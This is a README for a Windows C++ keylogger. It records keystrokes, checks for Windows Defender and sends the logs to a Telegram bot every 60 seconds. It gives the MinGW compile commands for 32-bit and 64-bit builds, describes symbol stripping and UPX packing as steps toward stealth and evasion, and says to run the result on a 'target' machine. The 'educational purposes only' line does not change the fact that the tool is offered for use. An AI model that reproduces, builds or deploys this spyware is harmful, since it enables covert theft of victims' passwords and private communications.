# Nytheon Keylogger

An advanced Windows keylogger written in C++ that logs keystrokes and sends them to a Telegram bot, with optional obfuscation and packing for stealth.

## **Functionality Overview**

- **`IsWindowsDefenderRunning`**  
  Checks if Windows Defender is actively running on the system.

- **`SendToTelegram`**  
  Sends logged keystroke data to a specified Telegram bot using the Telegram API.

- **`LogKeystrokes`**  
  Monitors and logs all keystrokes. Data is saved locally and sent to your Telegram bot every minute.

---

## **Building the Code**

### **1. Requirements**

- `g++` or `MinGW-w64` cross-compiler on Linux
- Source file: `nytheon-keylogger.cpp`

### **2. Compile for 64-bit Windows:**

```bash
x86_64-w64-mingw32-g++ -static -O2 nytheon-keylogger.cpp -o nytheon-keylogger.exe -lwininet -lws2_32
```

### **3. Compile for 32-bit Windows:**

```bash
i686-w64-mingw32-g++ -static -O2 nytheon-keylogger.cpp -o nytheon-keylogger32.exe -lwininet -lws2_32
```

---

## **Optional: Obfuscation & Packing**

### **1. Strip Symbols**

Reduce file size and hinder reverse engineering:

```bash
strip nytheon-keylogger.exe
```

### **2. UPX Packing**

Compress the executable for stealth:

```bash
upx --best nytheon-keylogger.exe
```

---

## **Execution**

Run the compiled `.exe` on your target **Windows** machine.

---

## **Important Notes**

- Replace `YOUR_TELEGRAM_BOT_TOKEN` and `YOUR_CHAT_ID` in the code with your actual Telegram bot credentials.
- This keylogger uses the `wininet` library for HTTP communication â€” hence the `-lwininet` linker flag.
- Logged keystrokes are saved to a local file named `keylog.txt`.
- Data is exfiltrated every 60 seconds to your Telegram bot.
- **Ensure you comply with local laws before using this software. This is for educational purposes only.**

---

**Author:** [Nytheon](https://t.me/Nytheon)
